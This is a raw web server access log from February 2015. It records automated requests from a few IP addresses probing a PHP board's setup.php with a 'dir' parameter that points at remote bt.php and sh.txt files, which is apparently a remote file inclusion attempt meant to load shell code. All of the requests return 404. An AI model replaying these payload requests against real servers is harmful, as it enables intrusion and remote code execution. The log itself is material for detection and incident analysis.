112.218.68.155 - - [19/Feb/2015:20:20:14 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [19/Feb/2015:20:20:15 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [19/Feb/2015:20:20:16 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [19/Feb/2015:20:20:20 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [19/Feb/2015:20:20:21 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [19/Feb/2015:20:20:22 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [19/Feb/2015:20:20:24 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [19/Feb/2015:20:20:33 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
112.218.68.155 - - [19/Feb/2015:20:20:34 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
112.218.68.155 - - [19/Feb/2015:20:20:35 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
112.218.68.155 - - [19/Feb/2015:20:20:36 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
178.33.226.103 - - [19/Feb/2015:20:20:38 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
178.33.226.103 - - [19/Feb/2015:20:20:40 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
178.33.226.103 - - [19/Feb/2015:20:20:40 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
178.33.226.103 - - [19/Feb/2015:20:20:41 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
1.224.163.80 - - [19/Feb/2015:20:21:10 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Advanced Browser (http://www.avantbrowser.com)" 
